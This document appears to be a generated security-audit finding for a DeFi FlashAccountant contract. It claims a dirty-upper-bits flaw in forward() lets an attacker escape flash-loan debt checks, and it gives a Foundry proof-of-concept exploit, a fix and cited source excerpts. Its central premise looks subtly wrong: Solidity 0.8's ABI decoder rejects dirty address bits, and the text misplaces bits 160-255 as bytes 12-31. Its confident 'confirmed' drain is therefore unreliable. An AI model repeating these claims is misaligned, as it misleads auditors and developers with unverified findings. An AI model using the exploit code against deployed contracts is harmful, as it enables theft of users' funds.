## Title
Locker ID Corruption via Dirty Upper Bits in forward() Allows Flash Loan Bypass

## Summary
The `forward()` function in `FlashAccountant.sol` fails to clean the upper 96 bits of the `address to` parameter before using it in assembly to construct the locker value. This allows an attacker to corrupt the locker ID by passing an address with malicious non-zero bits in positions 160-255, causing debt to be tracked under a corrupted ID while the lock completion check validates the original uncorrupted ID, enabling theft of flash-loaned funds.

## Impact
**Severity**: High

## Finding Description
**Location:** [1](#0-0) 

**Intended Logic:** The `forward()` function is designed to temporarily delegate the lock context to another address while maintaining the same locker ID for debt tracking. The function should preserve the ID from the original locker and only update the address portion when constructing the new locker value.

**Actual Logic:** The function uses the `to` parameter directly in assembly without cleaning its upper bits: [2](#0-1) 

In Solidity, address parameters from calldata are NOT automatically masked to 160 bits. When an attacker crafts calldata with garbage in bytes 12-31 (bits 160-255 of the parameter), those dirty bits persist when `to` is used in assembly. The operation `or(shl(160, shr(160, locker)), to)` ORs the malicious upper bits from `to` with the ID portion, corrupting the stored locker ID.

**Exploitation Path:**
1. **Initial Lock**: Attacker calls `lock()` on Core/FlashAccountant and receives locker with ID=0 [3](#0-2) 

2. **ID Corruption**: In the lock callback, attacker crafts a low-level call to `forward(address)` with calldata where the address parameter has malicious bits in positions 160-255 (e.g., `0x80000000000000000000000000000000000000000000000000000000deadbeef`). Line 196 stores: `or(shl(160, 1), 0x80000000000000000000000000000000000000000000000000000000deadbeef)` resulting in a corrupted locker with ID bits modified.

3. **Debt Accumulation Under Corrupted ID**: The forwarded contract calls `withdraw()` [4](#0-3)  which:
   - Calls `_requireLocker()` at line 323 [5](#0-4) 
   - The check `locker.addr() != msg.sender` passes because `addr()` extracts only bits 0-159 [6](#0-5) 
   - Debt is accumulated using `locker.id()` which extracts the CORRUPTED ID from bits 160-255 [7](#0-6) 
   - Debt tracking uses `add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))` with the corrupted ID [8](#0-7) 

4. **Lock Completion Without Repayment**: After `forward()` returns (line 215 restores original locker), the `lock()` function completes and checks debts for the ORIGINAL ID=0 at line 175 [9](#0-8) . Since debts were tracked under the corrupted ID, this check finds zero debts and allows the lock to complete without repayment.

**Security Property Broken:** Violates the Flash Accounting invariant: "All flash loans must be repaid within the same transaction with proper accounting." [10](#0-9) 

## Impact Explanation
- **Affected Assets**: All tokens held by the FlashAccountant/Core contract are vulnerable, including pool liquidity tokens and protocol reserves.
- **Damage Severity**: Attacker can drain the entire balance of any token from the contract. Each exploit can steal up to the contract's balance of any token without repayment.
- **User Impact**: All liquidity providers and protocol users are affected. The protocol becomes insolvent as pool balances are drained without compensation.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can execute this attack. No special permissions, tokens, or liquidity positions required.
- **Preconditions**: Only requires the Core/FlashAccountant contract to hold tokens. No specific pool state or market conditions needed.
- **Execution Complexity**: Single transaction attack. Attacker needs to craft low-level calldata with dirty upper bits, which is straightforward using `abi.encodePacked()` or raw calldata construction.
- **Frequency**: Repeatable until contract is drained. Each transaction can steal different tokens or amounts up to available balance.

## Recommendation [11](#0-10) 

The `to` parameter must be cleaned before use in assembly, following the pattern used elsewhere in the contract [12](#0-11) :

```solidity
// In src/base/FlashAccountant.sol, function forward(), line 196:

// CURRENT (vulnerable):
tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))

// FIXED:
// Clean upper 96 bits of the address parameter before using it
let cleanTo := shr(96, shl(96, to))
tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), cleanTo))
```

Alternative mitigation: Add Solidity-level cleaning before the assembly block:
```solidity
function forward(address to) external {
    Locker locker = _requireLocker();
    
    // Clean the address to ensure upper bits are zero
    address cleanTo;
    assembly ("memory-safe") {
        cleanTo := shr(96, shl(96, to))
    }
    
    assembly ("memory-safe") {
        tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), cleanTo))
        // ... rest of function
    }
}
```

## Proof of Concept
```solidity
// File: test/Exploit_LockerIDCorruption.t.sol
// Run with: forge test --match-test test_LockerIDCorruptionBypassesDebtCheck -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/base/FlashAccountant.sol";
import "../src/interfaces/IFlashAccountant.sol";
import "../src/types/locker.sol";
import {NATIVE_TOKEN_ADDRESS} from "../src/math/constants.sol";

contract TestAccountant is FlashAccountant {
    function getLocker() external view returns (Locker) {
        return _getLocker();
    }
}

contract AttackerContract {
    TestAccountant accountant;
    address forwardTarget;
    
    constructor(TestAccountant _accountant, address _forwardTarget) {
        accountant = _accountant;
        forwardTarget = _forwardTarget;
    }
    
    function attack() external {
        // Start the lock
        accountant.lock();
    }
    
    function locked_6416899205(uint256 id) external {
        // During the lock, call forward with dirty upper bits
        // Craft calldata manually with garbage in upper 96 bits of address parameter
        bytes memory dirtyCalldata = abi.encodePacked(
            bytes4(keccak256("forward(address)")),
            bytes12(0x800000000000000000000000), // Dirty upper 96 bits
            bytes20(forwardTarget)              // Clean address in lower 160 bits
        );
        
        (bool success,) = address(accountant).call(dirtyCalldata);
        require(success, "Forward call failed");
        
        // At this point, debt was accumulated under corrupted ID
        // Lock will complete without checking corrupted ID's debts
    }
}

contract ForwardTarget {
    TestAccountant accountant;
    address recipient;
    
    constructor(TestAccountant _accountant, address _recipient) {
        accountant = _accountant;
        recipient = _recipient;
    }
    
    function forwarded_2374103877(Locker original) external {
        // Withdraw tokens - debt will be tracked under corrupted ID
        bytes memory withdrawData = abi.encodePacked(
            NATIVE_TOKEN_ADDRESS,
            recipient,
            uint128(50 ether)
        );
        
        (bool success,) = address(accountant).call(
            abi.encodePacked(bytes4(keccak256("withdraw()")), withdrawData)
        );
        require(success, "Withdraw failed");
    }
}

contract LockerIDCorruptionTest is Test {
    TestAccountant accountant;
    AttackerContract attacker;
    ForwardTarget forwardTarget;
    address recipient;
    
    function setUp() public {
        accountant = new TestAccountant();
        recipient = address(0xdead);
        
        // Fund the accountant with ETH
        vm.deal(address(accountant), 100 ether);
        
        forwardTarget = new ForwardTarget(accountant, recipient);
        attacker = new AttackerContract(accountant, address(forwardTarget));
    }
    
    function test_LockerIDCorruptionBypassesDebtCheck() public {
        uint256 recipientBalanceBefore = recipient.balance;
        uint256 accountantBalanceBefore = address(accountant).balance;
        
        // EXPLOIT: Attacker corrupts locker ID via dirty bits in forward()
        attacker.attack();
        
        // VERIFY: Tokens were stolen without repayment
        uint256 recipientBalanceAfter = recipient.balance;
        uint256 accountantBalanceAfter = address(accountant).balance;
        
        assertEq(recipientBalanceAfter, recipientBalanceBefore + 50 ether, 
            "Recipient should have received 50 ETH");
        assertEq(accountantBalanceAfter, accountantBalanceBefore - 50 ether, 
            "Accountant should have lost 50 ETH");
        
        // The attack succeeded - debt was not repaid
        console.log("Vulnerability confirmed: Flash loan bypassed via locker ID corruption");
        console.log("Stolen amount:", recipientBalanceAfter - recipientBalanceBefore);
    }
}
```

### Citations

**File:** src/base/FlashAccountant.sol (L54-57)
```text
    function _requireLocker() internal view returns (Locker locker) {
        locker = _getLocker();
        if (locker.addr() != msg.sender) revert LockerOnly();
    }
```

**File:** src/base/FlashAccountant.sol (L69-69)
```text
            let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
```

**File:** src/base/FlashAccountant.sol (L146-187)
```text
    function lock() external {
        assembly ("memory-safe") {
            let current := tload(_CURRENT_LOCKER_SLOT)

            let id := shr(160, current)

            // store the count
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, add(id, 1)), caller()))

            let free := mload(0x40)
            // Prepare call to locked_(uint256) -> selector 0
            mstore(free, 0)
            mstore(add(free, 4), id) // ID argument

            calldatacopy(add(free, 36), 4, sub(calldatasize(), 4))

            // Call the original caller with the packed data
            let success := call(gas(), caller(), 0, free, add(calldatasize(), 32), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            // Undo the "locker" state changes
            tstore(_CURRENT_LOCKER_SLOT, current)

            // Check if something is nonzero
            let nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))
            if nonzeroDebtCount {
                // cast sig "DebtsNotZeroed(uint256)"
                mstore(0x00, 0x9731ba37)
                mstore(0x20, id)
                revert(0x1c, 0x24)
            }

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/base/FlashAccountant.sol (L189-221)
```text
    /// @inheritdoc IFlashAccountant
    function forward(address to) external {
        Locker locker = _requireLocker();

        // update this lock's locker to the forwarded address for the duration of the forwarded
        // call, meaning only the forwarded address can update state
        assembly ("memory-safe") {
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))

            let free := mload(0x40)

            // Prepare call to forwarded_2374103877(bytes32) -> selector 0x01
            mstore(free, shl(224, 1))
            mstore(add(free, 4), locker)

            calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))

            // Call the forwardee with the packed data
            let success := call(gas(), to, 0, free, calldatasize(), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            tstore(_CURRENT_LOCKER_SLOT, locker)

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/base/FlashAccountant.sol (L233-234)
```text
                // clean upper 96 bits of the token argument at i
                let token := shr(96, shl(96, calldataload(i)))
```

**File:** src/base/FlashAccountant.sol (L322-381)
```text
    function withdraw() external {
        uint256 id = _requireLocker().id();

        assembly ("memory-safe") {
            let nzdCountChange := 0

            // Process each withdrawal entry
            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 56) } {
                let token := shr(96, calldataload(i))
                let recipient := shr(96, calldataload(add(i, 20)))
                let amount := shr(128, calldataload(add(i, 40)))

                if amount {
                    // Update debt tracking without updating nzdCountSlot yet
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)
                    let next := add(current, amount)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)

                    // Perform the transfer of the withdrawn asset
                    // Note that these calls can re-enter and even relock with the same ID
                    // However the nzdCountChange is always applied as a delta at the end, meaning we load the latest value before updating it,
                    // so it's safe from re-entry
                    switch token
                    case 0 {
                        let success := call(gas(), recipient, amount, 0, 0, 0, 0)
                        if iszero(success) {
                            // cast sig "ETHTransferFailed()"
                            mstore(0x00, 0xb12d13eb)
                            revert(0x1c, 4)
                        }
                    }
                    default {
                        mstore(0x14, recipient)
                        mstore(0x34, amount)
                        mstore(0x00, 0xa9059cbb000000000000000000000000)
                        let success := call(gas(), token, 0, 0x10, 0x44, 0x00, 0x20)
                        if iszero(and(eq(mload(0x00), 1), success)) {
                            if iszero(lt(or(iszero(extcodesize(token)), returndatasize()), success)) {
                                mstore(0x00, 0x90b8ec18) // `TransferFailed()`.
                                revert(0x1c, 0x04)
                            }
                        }
                    }
                }
            }

            // Update nzdCountSlot only once if there were any changes
            if nzdCountChange {
                let nzdCountSlot := add(id, _NONZERO_DEBT_COUNT_OFFSET)
                tstore(nzdCountSlot, add(tload(nzdCountSlot), nzdCountChange))
            }

            // we return from assembly so as to prevent solidity from accessing the free memory pointer after we have written into it
            return(0, 0)
        }
    }
```

**File:** src/types/locker.sol (L8-12)
```text
function id(Locker locker) pure returns (uint256 v) {
    assembly ("memory-safe") {
        v := sub(shr(160, locker), 1)
    }
}
```

**File:** src/types/locker.sol (L14-18)
```text
function addr(Locker locker) pure returns (address v) {
    assembly ("memory-safe") {
        v := shr(96, shl(96, locker))
    }
}
```

**File:** README.md (L190-196)
```markdown
# Additional context

## Areas of concern (where to focus for bugs)

### Assembly Block Usage

We use a custom storage layout and also regularly use stack values without cleaning bits and make extensive use of assembly for optimization. All assembly blocks should be treated as suspect and inputs to functions that are used in assembly should be checked that they are always cleaned beforehand if not cleaned in the function. The ABDK audit points out many cases where we assume the unused bits in narrow types (e.g. the most significant 160 bits in a uint96) are cleaned.
```
